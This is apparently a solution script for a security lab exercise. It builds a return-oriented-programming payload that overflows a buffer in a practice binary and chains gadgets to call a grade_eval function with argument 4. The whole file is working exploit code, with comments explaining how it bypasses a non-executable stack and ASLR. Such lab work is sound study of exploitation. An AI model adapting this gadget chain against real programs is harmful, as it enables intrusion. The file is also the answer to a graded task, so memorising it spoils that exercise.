#!/usr/bin/env python3
"""Task 3: ROP against attack/dark-calc-nx (NX stack + ASLR).

The stack is not executable and the stack address is randomized, but the
binary is non-PIE, so we reuse code already present in its text/rodata:

    0x401a34  ret                 (stack-alignment trampoline)
    0x401a33  pop rdi ; ret       (bytes 5f c3 at the end of __libc_csu_init)
    0x401978  grade_eval

Chain: ret -> pop rdi; ret -> 4 -> grade_eval(4) -> exit@plt
The extra `ret` fixes the 16-byte stack alignment that glibc's printf requires.
"""
import struct
import sys

p64 = lambda x: struct.pack("<Q", x)

RET = 0x401A34        # ret  (alignment)
POP_RDI = 0x401A33    # pop rdi ; ret
GRADE_EVAL = 0x401978 # grade_eval(int)
EXIT_PLT = 0x4016E0   # exit@plt

payload = b"A" * 24   # 16-byte expression buffer + 8-byte saved rbp
payload += p64(RET) + p64(POP_RDI) + p64(4) + p64(GRADE_EVAL) + p64(EXIT_PLT)

sys.stdout.buffer.write(payload)
